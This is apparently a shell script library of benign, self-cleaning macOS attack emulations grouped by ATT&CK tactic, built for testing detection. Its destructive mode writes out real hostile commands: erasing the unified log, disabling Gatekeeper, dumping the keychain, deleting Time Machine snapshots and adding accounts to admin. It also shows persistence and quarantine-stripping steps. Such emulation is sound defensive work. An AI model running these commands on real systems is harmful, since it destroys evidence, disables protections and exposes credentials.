# scenarios.sh — the emulation library. Each scenario is a documented macOS technique run through its real
# living-off-the-land binary with a benign, self-cleaning payload. Grouped by MITRE ATT&CK tactic.
# Sources: LOOBins (loobins.io), MITRE ATT&CK macOS, Atomic Red Team, Objective-See, SentinelOne, Jamf Threat Labs.
# shellcheck disable=SC2016,SC2129

# =============================== EXECUTION ===============================================================

sc_osascript_shell() { case "$1" in
  meta) echo 'T1059.002|osascript runs a shell command (AMOS/stealer pattern)|execution|osascript|/usr/bin/osascript|ProcessStart';;
  run)  osascript -e "do shell script \"echo $NONCE\"" >/dev/null 2>&1 || true;;
  clean) :;; esac; }
RT+=(sc_osascript_shell)

sc_bash_c() { case "$1" in
  meta) echo 'T1059.004|shell -c one-liner|execution|bash|/bin/bash|ProcessStart';;
  run)  /bin/bash -c "echo $NONCE >/dev/null";;
  clean) :;; esac; }
RT+=(sc_bash_c)

sc_curl_pipe_shell() { case "$1" in
  meta) echo 'T1059.004|curl output piped to a shell (curl to bash)|execution|bash|/bin/bash|ProcessStart';;
  run)  /bin/bash -c "echo 'echo $NONCE' | /bin/bash >/dev/null";;
  clean) :;; esac; }
RT+=(sc_curl_pipe_shell)

sc_python_inline() { case "$1" in
  meta) echo 'T1059.006|python inline code|execution|python3|/usr/bin/python3|ProcessStart';;
  run)  /usr/bin/python3 -c "print('$NONCE')" >/dev/null 2>&1 || true;;
  clean) :;; esac; }
RT+=(sc_python_inline)

sc_osa_interp() { case "$1" in
  meta) echo 'T1059.005|AppleScript via osascript (interpreter)|execution|osascript|/usr/bin/osascript|ProcessStart';;
  run)  osascript -e "return \"$NONCE\"" >/dev/null 2>&1 || true;;
  clean) :;; esac; }
RT+=(sc_osa_interp)

sc_ingress_curl() { case "$1" in
  meta) echo 'T1105|ingress tool transfer: curl download|command-and-control|curl|/usr/bin/curl|ProcessStart';;
  run)  curl -s -m 2 -o "$WORK/payload.$NONCE" "http://127.0.0.1:9/$NONCE" >/dev/null 2>&1 || true;;
  clean) rm -f "$WORK/payload.$NONCE";; esac; }
RT+=(sc_ingress_curl)

sc_ingress_nscurl() { case "$1" in
  meta) echo 'T1105|ingress tool transfer: nscurl download (LOOBin)|command-and-control|nscurl|/usr/bin/nscurl|ProcessStart';;
  run)  /usr/bin/nscurl -m 2 "http://127.0.0.1:9/$NONCE" >/dev/null 2>&1 || true;;
  clean) :;; esac; }
RT+=(sc_ingress_nscurl)

sc_open_decoy() { case "$1" in
  meta) echo 'T1204.002|user execution: open a decoy file|execution|open|/usr/bin/open|ProcessStart';;
  run)  local f; f="$WORK/decoy.$NONCE.txt"; echo "$NONCE" > "$f"; /usr/bin/open -g "$f" >/dev/null 2>&1 || true;;
  clean) rm -f "$WORK/decoy.$NONCE.txt";; esac; }
RT+=(sc_open_decoy)

# =============================== PERSISTENCE =============================================================

sc_launchagent() { case "$1" in
  meta) echo 'T1543.001|persistence: user LaunchAgent plist|persistence|launchctl|launchctl/plist|FileCreate|LaunchAgents/com.esd-redteam';;
  run)  local p="$HOME/Library/LaunchAgents/com.esd-redteam.$NONCE.plist"; mkdir -p "$HOME/Library/LaunchAgents"
        /usr/bin/plutil -create xml1 "$p" >/dev/null 2>&1 || cat > "$p" <<P
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict><key>Label</key><string>com.esd-redteam.$NONCE</string>
<key>ProgramArguments</key><array><string>/usr/bin/true</string></array><key>RunAtLoad</key><true/></dict></plist>
P
        /bin/launchctl load "$p" >/dev/null 2>&1 || true;;
  clean) local p="$HOME/Library/LaunchAgents/com.esd-redteam.$NONCE.plist"; /bin/launchctl unload "$p" >/dev/null 2>&1 || true; rm -f "$p";; esac; }
RT+=(sc_launchagent)

sc_loginitem() { case "$1" in
  meta) echo 'T1547.015|persistence: login item via System Events|persistence|osascript|/usr/bin/osascript|ProcessStart';;
  run)  osascript -e "tell application \"System Events\" to make login item at end with properties {path:\"$WORK\", name:\"esd-redteam-$NONCE\", hidden:true}" >/dev/null 2>&1 || true;;
  clean) osascript -e "tell application \"System Events\" to delete login item \"esd-redteam-$NONCE\"" >/dev/null 2>&1 || true;; esac; }
RT+=(sc_loginitem)

sc_cron() { case "$1" in
  meta) echo 'T1053.003|persistence: user crontab entry|persistence|crontab|/usr/bin/crontab|ProcessStart|-';;
  run)  CRON_BAK="$WORK/crontab.bak"; /usr/bin/crontab -l > "$CRON_BAK" 2>/dev/null || : > "$CRON_BAK"
        { cat "$CRON_BAK"; echo "# esd-redteam $NONCE"; echo "*/59 * * * * /usr/bin/true # esd-redteam $NONCE"; } | /usr/bin/crontab - 2>/dev/null || true;;
  clean) [ -f "$WORK/crontab.bak" ] && /usr/bin/crontab "$WORK/crontab.bak" 2>/dev/null || /usr/bin/crontab -r 2>/dev/null || true;; esac; }
RT+=(sc_cron)

sc_rcfile() { case "$1" in
  meta) echo 'T1546.004|persistence: shell rc file trigger|persistence|shell-profile|FileCreate|.esd-redteam-rc';;
  run)  echo "# esd-redteam $NONCE" > "$WORK/.esd-redteam-rc.$NONCE";;
  clean) rm -f "$WORK/.esd-redteam-rc.$NONCE";; esac; }
RT+=(sc_rcfile)

sc_launchdaemon() { case "$1" in
  meta) echo 'T1543.004|persistence: system LaunchDaemon (root)|persistence|launchctl|launchctl/plist|FileCreate|LaunchDaemons/com.esd-redteam';;
  run)  destructive "p=/Library/LaunchDaemons/com.esd-redteam.$NONCE.plist; printf '<?xml version=\"1.0\"?>\n<plist version=\"1.0\"><dict><key>Label</key><string>com.esd-redteam.$NONCE</string><key>ProgramArguments</key><array><string>/usr/bin/true</string></array></dict></plist>\n' | sudo tee \$p >/dev/null" "write /Library/LaunchDaemons plist";;
  clean) [ "$DESTRUCTIVE" = 1 ] && sudo rm -f "/Library/LaunchDaemons/com.esd-redteam.$NONCE.plist" 2>/dev/null || true;; esac; }
RT+=(sc_launchdaemon)

# =============================== DEFENSE EVASION ========================================================

sc_quarantine_strip() { case "$1" in
  meta) echo 'T1553.001|remove com.apple.quarantine (Gatekeeper bypass)|defense-evasion|xattr|/usr/bin/xattr|ProcessStart';;
  run)  local f="$WORK/dropped.$NONCE"; echo "$NONCE" > "$f"; /usr/bin/xattr -w com.apple.quarantine "0081;00000000;redteam;$NONCE" "$f" 2>/dev/null; /usr/bin/xattr -d com.apple.quarantine "$f" 2>/dev/null || true;;
  clean) rm -f "$WORK/dropped.$NONCE";; esac; }
RT+=(sc_quarantine_strip)

sc_chmod_x() { case "$1" in
  meta) echo 'T1222.002|make a dropped payload executable|defense-evasion|chmod|/bin/chmod|ProcessStart';;
  run)  local f="$WORK/payload.$NONCE.sh"; echo "#!/bin/sh" > "$f"; /bin/chmod +x "$f";;
  clean) rm -f "$WORK/payload.$NONCE.sh";; esac; }
RT+=(sc_chmod_x)

sc_indicator_rm() { case "$1" in
  meta) echo 'T1070.004|indicator removal: delete a dropped file|defense-evasion|rm|/bin/rm|FileDelete|esd-redteam-ioc';;
  run)  local f="$WORK/esd-redteam-ioc.$NONCE"; echo "$NONCE" > "$f"; /bin/rm -f "$f";;
  clean) :;; esac; }
RT+=(sc_indicator_rm)

sc_base64_decode() { case "$1" in
  meta) echo 'T1140|deobfuscate/decode with base64|defense-evasion|base64|/usr/bin/base64|ProcessStart|-';;
  run)  echo "$NONCE" | /usr/bin/base64 | /usr/bin/base64 -D >/dev/null 2>&1 || true;;
  clean) :;; esac; }
RT+=(sc_base64_decode)

sc_gatekeeper_status() { case "$1" in
  meta) echo 'T1562.001|query/disable Gatekeeper (spctl)|defense-evasion|spctl|/usr/sbin/spctl|ProcessStart|-';;
  run)  if [ "$DESTRUCTIVE" = 1 ]; then sudo /usr/sbin/spctl --master-disable >/dev/null 2>&1 || true; else /usr/sbin/spctl --status >/dev/null 2>&1 || true; note "ran spctl --status; --master-disable only under ESD_RT_DESTRUCTIVE=1"; fi;;
  clean) [ "$DESTRUCTIVE" = 1 ] && sudo /usr/sbin/spctl --master-enable >/dev/null 2>&1 || true;; esac; }
RT+=(sc_gatekeeper_status)

sc_log_tamper() { case "$1" in
  meta) echo 'T1070|unified log used/erased (log)|defense-evasion|log|/usr/bin/log|ProcessStart|-';;
  run)  if [ "$DESTRUCTIVE" = 1 ]; then sudo /usr/bin/log erase --all >/dev/null 2>&1 || true; note "ran log erase --all (wiped the unified log!)"; else /usr/bin/log stats >/dev/null 2>&1 || true; note "ran log stats; log erase only under ESD_RT_DESTRUCTIVE=1 (it wipes evidence)"; fi;;
  clean) :;; esac; }
RT+=(sc_log_tamper)

sc_tmutil_backup() { case "$1" in
  meta) echo 'T1490|inhibit recovery: query Time Machine (tmutil, LOOBin)|defense-evasion|tmutil|/usr/bin/tmutil|ProcessStart|-';;
  run)  /usr/bin/tmutil status >/dev/null 2>&1 || /usr/bin/tmutil destinationinfo >/dev/null 2>&1 || true; note "read-only tmutil; deletelocalsnapshots only under ESD_RT_DESTRUCTIVE=1";
        destructive "/usr/bin/tmutil deletelocalsnapshots / >/dev/null 2>&1 || true" "tmutil deletelocalsnapshots" || true;;
  clean) :;; esac; }
RT+=(sc_tmutil_backup)

# =============================== CREDENTIAL ACCESS ======================================================

sc_keychain() { case "$1" in
  meta) echo 'T1555.001|keychain access (security)|credential-access|security|/usr/bin/security|ProcessStart';;
  run)  /usr/bin/security find-generic-password -a "esd-redteam-$NONCE" >/dev/null 2>&1 || true; note "read-only lookup; dump-keychain only under ESD_RT_DESTRUCTIVE=1";
        destructive "/usr/bin/security dump-keychain >/dev/null 2>&1 || true" "security dump-keychain" || true;;
  clean) :;; esac; }
RT+=(sc_keychain)

sc_browser_creds() { case "$1" in
  meta) echo 'T1555.003|copy a browser credential store (decoy path)|credential-access|cp|/bin/cp|FileCreate|Login Data';;
  run)  local d="$WORK/Chrome.$NONCE"; mkdir -p "$d"; echo "$NONCE" > "$d/Login Data"; /bin/cp "$d/Login Data" "$WORK/stolen-logindata.$NONCE";;
  clean) rm -rf "$WORK/Chrome.$NONCE" "$WORK/stolen-logindata.$NONCE";; esac; }
RT+=(sc_browser_creds)

sc_tcc_db() { case "$1" in
  meta) echo 'T1082|read the TCC database with sqlite3 (on a copy)|credential-access|sqlite3|/usr/bin/sqlite3|ProcessStart';;
  run)  local c="$WORK/TCC.$NONCE.db"; /bin/cp "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "$c" 2>/dev/null || /usr/bin/sqlite3 "$c" "create table access(x)" 2>/dev/null; /usr/bin/sqlite3 "$c" ".tables" >/dev/null 2>&1 || true;;
  clean) rm -f "$WORK/TCC.$NONCE.db";; esac; }
RT+=(sc_tcc_db)

sc_creds_in_files() { case "$1" in
  meta) echo 'T1552.001|search files for credentials (grep)|credential-access|grep|/usr/bin/grep|ProcessStart';;
  run)  local d="$WORK/docs.$NONCE"; mkdir -p "$d"; echo "password=hunter2 $NONCE" > "$d/notes.txt"; /usr/bin/grep -r -i password "$d" >/dev/null 2>&1 || true;;
  clean) rm -rf "$WORK/docs.$NONCE";; esac; }
RT+=(sc_creds_in_files)

# =============================== DISCOVERY ==============================================================

sc_system_profiler() { case "$1" in
  meta) echo 'T1082|system information discovery (system_profiler, LOOBin)|discovery|system_profiler|/usr/sbin/system_profiler|ProcessStart|-';;
  run)  /usr/sbin/system_profiler SPHardwareDataType >/dev/null 2>&1 || true;;
  clean) :;; esac; }
RT+=(sc_system_profiler)

sc_account_disc() { case "$1" in
  meta) echo 'T1087.001|local account discovery (dscl)|discovery|dscl|/usr/bin/dscl|ProcessStart|-';;
  run)  /usr/bin/dscl . -list /Users >/dev/null 2>&1 || true;;
  clean) :;; esac; }
RT+=(sc_account_disc)

sc_whoami() { case "$1" in
  meta) echo 'T1033|owner/user discovery (whoami)|discovery|whoami|/usr/bin/whoami|ProcessStart|-';;
  run)  /usr/bin/whoami >/dev/null 2>&1 || true; /usr/bin/id >/dev/null 2>&1 || true;;
  clean) :;; esac; }
RT+=(sc_whoami)

sc_secsoftware_disc() { case "$1" in
  meta) echo 'T1518.001|security software discovery|discovery|ps|/bin/ps|ProcessStart|-';;
  run)  /bin/ps -axo pid,comm >/dev/null 2>&1 || true; /usr/bin/pgrep -l . >/dev/null 2>&1 || true;;
  clean) :;; esac; }
RT+=(sc_secsoftware_disc)

sc_anti_vm() { case "$1" in
  meta) echo 'T1497.001|virtualization/sandbox check (ioreg)|discovery|ioreg|/usr/sbin/ioreg|ProcessStart|-';;
  run)  /usr/sbin/ioreg -l >/dev/null 2>&1 || true;;
  clean) :;; esac; }
RT+=(sc_anti_vm)

sc_net_config() { case "$1" in
  meta) echo 'T1016|network configuration discovery (networksetup)|discovery|networksetup|/usr/sbin/networksetup|ProcessStart|-';;
  run)  /usr/sbin/networksetup -listallnetworkservices >/dev/null 2>&1 || true;;
  clean) :;; esac; }
RT+=(sc_net_config)

# =============================== COLLECTION / EXFIL =====================================================

sc_clipboard() { case "$1" in
  meta) echo 'T1115|clipboard data (pbpaste, LOOBin)|collection|pbpaste|/usr/bin/pbpaste|ProcessStart|-';;
  run)  /usr/bin/pbpaste >/dev/null 2>&1 || true;;
  clean) :;; esac; }
RT+=(sc_clipboard)

sc_screencapture() { case "$1" in
  meta) echo 'T1113|screen capture (screencapture, LOOBin)|collection|screencapture|/usr/sbin/screencapture|ProcessStart';;
  run)  /usr/sbin/screencapture -x "$WORK/screen.$NONCE.png" >/dev/null 2>&1 || true;;
  clean) rm -f "$WORK/screen.$NONCE.png";; esac; }
RT+=(sc_screencapture)

sc_archive() { case "$1" in
  meta) echo 'T1560.001|archive collected data (ditto, LOOBin)|collection|ditto|/usr/bin/ditto|ProcessStart';;
  run)  local d="$WORK/loot.$NONCE"; mkdir -p "$d"; echo "$NONCE" > "$d/f.txt"; /usr/bin/ditto -c -k "$d" "$WORK/loot.$NONCE.zip" >/dev/null 2>&1 || /usr/bin/tar -czf "$WORK/loot.$NONCE.tgz" -C "$WORK" "loot.$NONCE" >/dev/null 2>&1 || true;;
  clean) rm -rf "$WORK/loot.$NONCE" "$WORK/loot.$NONCE.zip" "$WORK/loot.$NONCE.tgz";; esac; }
RT+=(sc_archive)

sc_collect_find() { case "$1" in
  meta) echo 'T1119|automated collection (find documents)|collection|find|/usr/bin/find|ProcessStart|-';;
  run)  /usr/bin/find "$WORK" -name "*.txt" >/dev/null 2>&1 || true;;
  clean) :;; esac; }
RT+=(sc_collect_find)

sc_exfil_curl() { case "$1" in
  meta) echo 'T1041|exfiltration over C2 (curl upload to localhost)|exfiltration|curl|/usr/bin/curl|ProcessStart';;
  run)  echo "$NONCE" > "$WORK/exfil.$NONCE"; curl -s -m 2 -T "$WORK/exfil.$NONCE" "http://127.0.0.1:9/$NONCE" >/dev/null 2>&1 || true;;
  clean) rm -f "$WORK/exfil.$NONCE";; esac; }
RT+=(sc_exfil_curl)

# =============================== PRIVILEGE ESCALATION / ACCOUNT =========================================

sc_sudo() { case "$1" in
  meta) echo 'T1548.003|sudo elevation|privilege-escalation|sudo|/usr/bin/sudo|ProcessStart|-';;
  run)  /usr/bin/sudo -n /usr/bin/true >/dev/null 2>&1 || true;;
  clean) :;; esac; }
RT+=(sc_sudo)

sc_group_check() { case "$1" in
  meta) echo 'T1098|account/group manipulation (dseditgroup)|persistence|dseditgroup|/usr/sbin/dseditgroup|ProcessStart|-';;
  run)  /usr/sbin/dseditgroup -o checkmember -m "$(/usr/bin/whoami)" admin >/dev/null 2>&1 || true; note "read-only checkmember; add-member only under ESD_RT_DESTRUCTIVE=1";
        destructive "sudo /usr/sbin/dseditgroup -o edit -a esd-redteam-$NONCE -t user admin >/dev/null 2>&1; sudo /usr/sbin/dseditgroup -o edit -d esd-redteam-$NONCE -t user admin >/dev/null 2>&1 || true" "dseditgroup add to admin" || true;;
  clean) :;; esac; }
RT+=(sc_group_check)

sc_create_account() { case "$1" in
  meta) echo 'T1136.001|create a local account (dscl, root)|persistence|dscl|/usr/bin/dscl|ProcessStart';;
  run)  destructive "sudo /usr/bin/dscl . -create /Users/esd-redteam-$NONCE >/dev/null 2>&1 || true" "dscl create a user account";;
  clean) [ "$DESTRUCTIVE" = 1 ] && sudo /usr/bin/dscl . -delete "/Users/esd-redteam-$NONCE" >/dev/null 2>&1 || true;; esac; }
RT+=(sc_create_account)
